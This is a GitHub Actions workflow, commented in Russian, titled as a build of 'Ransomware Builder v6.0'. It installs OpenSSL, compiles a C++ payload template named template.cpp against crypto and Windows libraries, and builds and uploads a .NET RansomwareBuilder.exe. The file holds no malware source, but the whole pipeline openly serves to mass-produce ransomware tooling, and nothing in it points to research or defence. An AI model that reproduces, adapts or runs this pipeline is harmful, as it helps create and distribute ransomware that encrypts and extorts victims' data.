name: Build Ransomware Builder v6.0 (Full Power)

on:
  push:
    branches: [ main ]
  workflow_dispatch:

env:
  VCPKG_ROOT: C:\vcpkg
  OPENSSL_ROOT_DIR: C:\Program Files\OpenSSL

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - name: Checkout
      uses: actions/checkout@v4
    
    # ========== КЭШ VCPKG ==========
    - name: Cache vcpkg
      uses: actions/cache@v3
      id: cache-vcpkg
      with:
        path: |
          C:\vcpkg
          C:\vcpkg\installed
          C:\Users\runneradmin\AppData\Local\vcpkg\archives
        key: vcpkg-${{ runner.os }}-${{ hashFiles('**/vcpkg.json') }}
        restore-keys: |
          vcpkg-${{ runner.os }}-
    
    # ========== УСТАНОВКА OPENSSL ЧЕРЕЗ VCPKG ==========
    - name: Install OpenSSL via vcpkg
      if: steps.cache-vcpkg.outputs.cache-hit != 'true'
      run: |
        vcpkg install openssl:x64-windows-static
    
    # ========== КЭШ CHOCOLATEY OPENSSL ==========
    - name: Cache Chocolatey OpenSSL
      uses: actions/cache@v3
      id: cache-choco-openssl
      with:
        path: C:\Program Files\OpenSSL
        key: openssl-choco-${{ runner.os }}-v1
        restore-keys: |
          openssl-choco-${{ runner.os }}-
    
    # ========== УСТАНОВКА OPENSSL ЧЕРЕЗ CHOCOLATEY ==========
    - name: Install OpenSSL via Chocolatey
      if: steps.cache-choco-openssl.outputs.cache-hit != 'true'
      run: |
        choco install openssl -y --force
    
    # ========== ПОИСК БИБЛИОТЕК ==========
    - name: Find OpenSSL libs
      run: |
        Write-Host "=== Looking for OpenSSL libs ==="
        if (Test-Path "C:\Program Files\OpenSSL\lib") {
            Write-Host "=== C:\Program Files\OpenSSL\lib ==="
            Get-ChildItem -Recurse "C:\Program Files\OpenSSL\lib" | Format-Table -AutoSize
        }
        if (Test-Path "C:\vcpkg\installed\x64-windows-static\lib") {
            Write-Host "=== C:\vcpkg\installed\x64-windows-static\lib ==="
            Get-ChildItem "C:\vcpkg\installed\x64-windows-static\lib" | Format-Table -AutoSize
        }
        Write-Host "=== Looking for include ==="
        if (Test-Path "C:\Program Files\OpenSSL\include") {
            Write-Host "=== C:\Program Files\OpenSSL\include ==="
            Get-ChildItem "C:\Program Files\OpenSSL\include" | Format-Table -AutoSize
        }
        if (Test-Path "C:\vcpkg\installed\x64-windows-static\include") {
            Write-Host "=== C:\vcpkg\installed\x64-windows-static\include ==="
            Get-ChildItem "C:\vcpkg\installed\x64-windows-static\include" | Format-Table -AutoSize
        }
    
    # ========== СБОРКА ШАБЛОНА ==========
    - name: Setup MSVC
      uses: ilammy/msvc-dev-cmd@v1
    
    - name: Build Template
      run: |
        Write-Host "=== Trying to compile template.cpp ==="
        
        # Пробуем Chocolatey OpenSSL (libssl.lib)
        if ((Test-Path "C:\Program Files\OpenSSL\include\openssl\evp.h") -and (Test-Path "C:\Program Files\OpenSSL\lib\libssl.lib")) {
            Write-Host "Using libssl.lib (Chocolatey)"
            cl /O2 /MT /EHsc /std:c++17 /I"C:\Program Files\OpenSSL\include" /Fe:template.exe template.cpp /link user32.lib advapi32.lib shell32.lib crypt32.lib "C:\Program Files\OpenSSL\lib\libssl.lib" "C:\Program Files\OpenSSL\lib\libcrypto.lib"
        }
        # Пробуем Chocolatey OpenSSL (ssl.lib)
        elseif ((Test-Path "C:\Program Files\OpenSSL\include\openssl\evp.h") -and (Test-Path "C:\Program Files\OpenSSL\lib\ssl.lib")) {
            Write-Host "Using ssl.lib (Chocolatey)"
            cl /O2 /MT /EHsc /std:c++17 /I"C:\Program Files\OpenSSL\include" /Fe:template.exe template.cpp /link user32.lib advapi32.lib shell32.lib crypt32.lib "C:\Program Files\OpenSSL\lib\ssl.lib" "C:\Program Files\OpenSSL\lib\crypto.lib"
        }
        # Пробуем vcpkg OpenSSL
        elseif ((Test-Path "C:\vcpkg\installed\x64-windows-static\include\openssl\evp.h") -and (Test-Path "C:\vcpkg\installed\x64-windows-static\lib\ssl.lib")) {
            Write-Host "Using ssl.lib (vcpkg)"
            cl /O2 /MT /EHsc /std:c++17 /I"C:\vcpkg\installed\x64-windows-static\include" /Fe:template.exe template.cpp /link user32.lib advapi32.lib shell32.lib crypt32.lib "C:\vcpkg\installed\x64-windows-static\lib\ssl.lib" "C:\vcpkg\installed\x64-windows-static\lib\crypto.lib"
        }
        # Пробуем VC версию
        elseif ((Test-Path "C:\Program Files\OpenSSL\include\openssl\evp.h") -and (Test-Path "C:\Program Files\OpenSSL\lib\VC\x64\MD\libssl.lib")) {
            Write-Host "Using VC libssl.lib (Chocolatey)"
            cl /O2 /MT /EHsc /std:c++17 /I"C:\Program Files\OpenSSL\include" /Fe:template.exe template.cpp /link user32.lib advapi32.lib shell32.lib crypt32.lib "C:\Program Files\OpenSSL\lib\VC\x64\MD\libssl.lib" "C:\Program Files\OpenSSL\lib\VC\x64\MD\libcrypto.lib"
        }
        else {
            Write-Host "OpenSSL libs not found!"
            Get-ChildItem -Recurse "C:\Program Files\OpenSSL" | Format-Table -AutoSize
            Get-ChildItem -Recurse "C:\vcpkg\installed" | Format-Table -AutoSize
            exit 1
        }
        
        if (Test-Path template.exe) {
            Write-Host "=== Build SUCCESS ==="
            Get-ChildItem template.exe | Format-Table -AutoSize
        } else {
            Write-Host "=== Build FAILED ==="
            exit 1
        }
    
    # ========== СБОРКА БИЛДЕРА ==========
    - name: Setup .NET
      uses: actions/setup-dotnet@v4
      with:
        dotnet-version: '4.8.x'
    
    - name: Build Builder
      run: |
        dotnet build builder.csproj --configuration Release
        Get-ChildItem bin/Release/net48/RansomwareBuilder.exe | Format-Table -AutoSize
    
    - name: Upload Builder EXE
      uses: actions/upload-artifact@v4
      with:
        name: RansomwareBuilder_v6_Full
        path: bin/Release/net48/RansomwareBuilder.exe
